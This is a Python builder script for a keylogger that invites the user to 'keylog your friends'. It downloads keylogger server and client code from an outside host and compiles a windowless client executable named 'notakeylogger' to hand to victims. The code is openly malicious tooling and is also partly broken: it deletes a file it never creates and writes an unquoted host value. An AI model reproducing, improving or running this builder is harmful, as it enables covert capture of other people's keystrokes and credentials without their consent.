import os
from time import sleep
from tkinter import filedialog
import socket
import requests
import shutil

ip = socket.gethostbyname(socket.gethostname())

print("""
$$\      $$\           $$\                                             
$$ | $\  $$ |          $$ |                                            
$$ |$$$\ $$ | $$$$$$\  $$ | $$$$$$$\  $$$$$$\  $$$$$$\$$$$\   $$$$$$\  
$$ $$ $$\$$ |$$  __$$\ $$ |$$  _____|$$  __$$\ $$  _$$  _$$\ $$  __$$\ 
$$$$  _$$$$ |$$$$$$$$ |$$ |$$ /      $$ /  $$ |$$ / $$ / $$ |$$$$$$$$ |
$$$  / \$$$ |$$   ____|$$ |$$ |      $$ |  $$ |$$ | $$ | $$ |$$   ____|
$$  /   \$$ |\$$$$$$$\ $$ |\$$$$$$$\ \$$$$$$  |$$ | $$ | $$ |\$$$$$$$\ 
\__/     \__| \_______|\__| \_______| \______/ \__| \__| \__| \_______|
""")

print("Want to keylog your friends? Here is where you can!")
sleep(1)
print("To start, we need to set up the server!")
sleep(1)
print(f"The server will be hosted on {ip}:25595. This is your IP address and the set port.")
sleep(1)
input("Press ENTER to start generating the server...")

ServerCode = requests.get("https://anonymouskeylogger.netlify.app/assets/keylogger/server.py", allow_redirects=True)
os.mkdir("./Keylogger")
os.chdir("./Keylogger")

SR = open("./SERVER_RAW.py", "wb")
SR.write(ServerCode.content)
SR.close()

CN = open("./connections.py", "x")
CN.write(f"HOST_IP = '{ip}'\nHOST_PORT = 25595")
CN.close()

SI = open("./Server.ico", "wb")
output = requests.get("https://anonymouskeylogger.netlify.app/assets/icons/Server.ico", allow_redirects=True)
SI.write(output.content)
SI.close()
os.system('pyinstaller --onefile --icon "./Server.ico" --name "Server"  "./SERVER_RAW.py"')
print("Removing raw content...")
os.remove("./SERVER_RAW.py")
os.remove("./Server.ico")
os.remove("./connections.py")
shutil.rmtree("./build")
os.remove("./Server.spec")
shutil.move("./dist/Server.exe", "./Server.exe")
os.rmdir("./dist")
print("\nComplete!")
sleep(1)
input("Press ENTER to set up client to send to your friends!")

print("Downloading files...")
CF = open("./CLIENT_RAW.py", "wb")
CF.write(requests.get("https://anonymouskeylogger.netlify.app/assets/keylogger/keylogger.py", allow_redirects=True).content)
CF.close()

CCN = open("./connections.py", "x")
CCN.write(f"HOST = {ip}")
CCN.close()

CI = open("CLIENT_ICON.ico", "wb")
CI.write(requests.get("https://anonymouskeylogger.netlify.app/assets/icons/warning.ico", allow_redirects=True).content)
CI.close()

os.system("pyinstaller --onefile -w --icon ./CLIENT_ICON.ico --name notakeylogger ./CLIENT_RAW.py")
os.remove("./CLIENT_RAW.py")
os.remove("ClientConnections.py")
os.remove("CLIENT_ICON.ico")
shutil.rmtree("./build")
shutil.move("./dist/notakeylogger.exe", "./notakeylogger.exe")
os.rmdir("./dist")
os.remove("./notakeylogger.spec")
print("\nEverytin is set up!")
sleep(1)
input("Have fun :)")
sleep(2)
exit()
